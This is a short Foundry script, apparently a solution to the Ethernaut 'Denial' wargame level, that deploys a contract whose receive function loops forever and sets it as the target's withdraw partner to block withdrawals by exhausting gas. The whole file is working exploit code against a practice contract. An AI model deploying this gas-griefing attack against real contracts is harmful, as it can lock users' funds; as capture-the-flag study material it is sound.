// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract LoopPartner {
    receive() external payable {
        while (true) {}
    }
}

contract DenialSolution is Script {
    Denial denial = Denial(payable(0x73847AA979Ab506ec11c71e359365c4205c8A80E));
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        LoopPartner lp = new LoopPartner();
        denial.setWithdrawPartner(address(lp));
        vm.stopBroadcast();
        // console.log(denial.contractBalance());

        // vm.prank(address(0xA9E));
        // denial.withdraw();
        // console.log(denial.contractBalance());
    }
}
